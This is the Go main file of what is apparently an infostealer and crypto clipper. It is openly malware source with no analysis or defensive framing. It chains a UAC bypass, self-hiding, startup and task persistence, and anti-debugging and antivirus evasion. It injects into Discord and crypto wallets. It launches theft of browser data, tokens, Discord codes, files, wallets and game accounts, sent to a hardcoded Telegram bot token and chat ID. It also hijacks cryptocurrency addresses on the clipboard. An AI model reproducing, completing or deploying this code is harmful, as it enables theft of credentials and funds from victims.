package main

import (
	"./modules/adminpersistence"
	"./modules/antidebug"
	"./modules/antivirus"
	"./modules/browsers"
	"./modules/clipper"
	"./modules/commonfiles"
	"./modules/discodes"
	"./modules/discordinjection"
	"./modules/games"
	"./modules/hideconsole"
	"./modules/startup"
	"./modules/system"
	"./modules/taskpersistence"
	"./modules/tokens"
	"./modules/uacbypass"
	"./modules/wallets"
	"./modules/walletsinjection"
	"./modules/telegram"

	"./utils/program"
	"./utils/fileutil"
	"./utils/hardware"
	"./utils/requests"
)

var adminPersistenceFunc = adminpersistence.Run
var taskPersistenceFunc = taskpersistence.Run

func main() {
	CONFIG := map[string]interface{}{
		"webhook": "",
		"telegram_bot_token": "7371522678:AAEEXtQLnfe_22cLHpNqz3_PHkHfiEWeeuQ",
		"telegram_chat_id":   "8177009199",
		"cryptos": map[string]string{
			"BTC": "", "BCH": "", "ETH": "", "XMR": "", "LTC": "",
			"XCH": "", "XLM": "", "TRX": "", "ADA": "", "DASH": "", "DOGE": "",
		},
	}

	if program.IsAlreadyRunning() {
		return
	}

	uacbypass.Run()
	hideconsole.Run()
	program.HideSelf()

	if !program.IsInStartupPath() {
		go startup.Run()
	}

	go antidebug.Run()
	go antivirus.Run()

	go discordinjection.Run("", "")
	go walletsinjection.Run("", "", "")

	botToken := CONFIG["telegram_bot_token"].(string)
	chatID := CONFIG["telegram_chat_id"].(string)

	actions := []func(string, string){
		system.Run, browsers.Run, tokens.Run, discodes.Run,
		commonfiles.Run, wallets.Run, games.Run,
	}

	for _, action := range actions {
		go action(botToken, chatID)
	}

	clipper.Run(CONFIG["cryptos"].(map[string]string))
}